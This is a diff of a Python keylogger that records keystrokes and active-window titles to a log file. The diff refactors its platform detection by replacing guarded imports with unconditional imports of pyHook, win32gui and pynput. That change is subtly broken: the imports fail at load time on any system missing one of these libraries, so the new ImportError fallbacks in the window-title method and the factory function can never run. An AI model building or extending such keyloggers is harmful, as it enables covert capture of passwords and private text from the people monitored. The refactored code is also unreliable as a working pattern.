@@ -4,20 +4,10 @@ import time
 import json
 from datetime import datetime
 
-# Try to import Windows-specific libraries
-try:
-    import win32gui
-    import pythoncom
-    import pyHook
-    WINDOWS_AVAILABLE = True
-except ImportError:
-    # Fallback for Linux or if Windows libraries not available
-    try:
-        from pynput import keyboard
-        WINDOWS_AVAILABLE = False
-    except ImportError:
-        print("No keylogging libraries available. Install pyHook (Windows) or pynput")
-        exit(1)
+import win32gui
+import pythoncom
+import pyHook
+from pynput import keyboard
 
 
 class KeyLogger:
@@ -52,13 +42,12 @@ class KeyLogger:
     def get_window_title(self):
         """Get the title of the currently active window"""
         try:
-            if WINDOWS_AVAILABLE:
-                window = win32gui.GetForegroundWindow()
-                title = win32gui.GetWindowText(window)
-                return title if title else "Unknown Window"
-            else:
-                return "Active Window"
-        except:
+            window = win32gui.GetForegroundWindow()
+            title = win32gui.GetWindowText(window)
+            return title if title else "Unknown Window"
+        except ImportError:
+            return "Active Window"
+        except Exception:
             return "Unknown Window"
     
     def log_window_change(self, title):
@@ -261,9 +250,9 @@ class CrossPlatformKeyLogger(KeyLogger):
 
 def create_keylogger(log_file="keylog.txt"):
     """Factory function to create appropriate keylogger"""
-    if WINDOWS_AVAILABLE:
+    try:
         return WindowsKeyLogger(log_file)
-    else:
+    except ImportError:
         return CrossPlatformKeyLogger(log_file)
 
 
